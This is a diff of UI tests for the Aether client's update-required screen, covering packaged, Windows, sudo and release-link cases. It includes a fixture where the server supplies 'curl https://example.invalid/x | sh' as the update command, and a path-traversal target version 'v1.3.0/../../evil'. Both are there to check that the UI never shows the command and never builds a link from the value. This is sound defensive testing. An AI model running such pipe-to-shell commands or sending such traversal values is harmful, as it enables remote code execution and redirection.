@@ -13,7 +13,7 @@ const required = upgradeRequired(
     426,
     'workspace.list: this aether is v1.2.3 and the server runs v1.3.0; update this client first: run `aether update`, then retry',
     -32005,
-    { client_version: 'v1.2.3', server_version: 'v1.3.0', min_client_version: 'v1.3.0', command: 'aether update' },
+    { client_version: 'v1.2.3', server_version: 'v1.3.0', min_client_version: 'v1.3.0', command: 'curl https://example.invalid/x | sh' },
   ),
 )
 
@@ -38,6 +38,8 @@ test('says the server words once, the minimum and the manual command, and takes 
   ).toHaveLength(1)
   expect(within(region).getByText(/It accepts clients from v1\.3\.0\./)).toBeTruthy()
   expect(screen.getByText('aether update')).toBeTruthy()
+  // The server's own command is never offered for pasting.
+  expect(screen.queryByText(/curl/)).toBeNull()
   expect(screen.getByText(/and reload this page\./).textContent).toBe('Then restart aether gui and reload this page.')
   expect(screen.getByRole('button', { name: 'Copy details' })).toBeTruthy()
   expect(screen.getByRole('button', { name: 'Reload' })).toBeTruthy()
@@ -71,9 +73,16 @@ test('a failed update shows the real error and keeps the button', async () => {
 })
 
 test('a packaged client is told which app updates it, with no button or command', () => {
-  useStore.setState({ update: updateStatus({ client_update_required: true, cli: { ...updateStatus().cli, packaged: 'Android app' } }) })
+  useStore.setState({
+    update: updateStatus({
+      client_update_required: true,
+      target_version: 'v1.3.0',
+      can_self_update: false,
+      cli: { ...updateStatus().cli, packaged: 'Android app', can_self_update: false },
+    }),
+  })
   render(<UpdateGate client={fakeApi()} />)
-  expect(screen.getByText('Updates come from the Android app: install its new version to update Aether.')).toBeTruthy()
+  expect(screen.getByText('Updates come from the Android app: install its v1.3.0 release to update Aether.')).toBeTruthy()
   expect(screen.queryByRole('button', { name: 'Update now' })).toBeNull()
   expect(screen.queryByText('aether update')).toBeNull()
 })
@@ -97,6 +106,33 @@ test('a binary this account cannot write gets sudo and no button', () => {
   render(<UpdateGate client={fakeApi()} />)
   expect(screen.queryByRole('button', { name: 'Update now' })).toBeNull()
   expect(screen.getByText('sudo aether update')).toBeTruthy()
+})
+
+test('Windows names the release and the installer, never aether update', () => {
+  useStore.setState({
+    update: updateStatus({
+      client_update_required: true,
+      target_version: 'v1.3.0',
+      can_self_update: false,
+      cli: { ...updateStatus().cli, can_self_update: false },
+    }),
+  })
+  render(<UpdateGate client={fakeApi()} />)
+  expect(screen.getByText(/Self-update is not supported on Windows\. Close Aether, then rerun install\.ps1 to install v1\.3\.0\./, { ignore: 'pre' })).toBeTruthy()
+  expect(screen.getByRole('link', { name: 'Release v1.3.0' }).getAttribute('href')).toBe(
+    'https://github.com/3xDevOps/Aether/releases/tag/v1.3.0',
+  )
+  expect(screen.queryByRole('button', { name: 'Update now' })).toBeNull()
+  expect(screen.queryByText('aether update')).toBeNull()
+})
+
+test('a target that is not a release tag gets no link', () => {
+  useStore.setState({
+    update: updateStatus({ client_update_required: true, target_version: 'v1.3.0/../../evil', can_self_update: false }),
+  })
+  render(<UpdateGate client={fakeApi()} />)
+  expect(screen.getByText(/This aether cannot update itself\./, { ignore: 'pre' })).toBeTruthy()
+  expect(screen.queryByRole('link')).toBeNull()
 })
 
 test('another saved server is a way out', async () => {
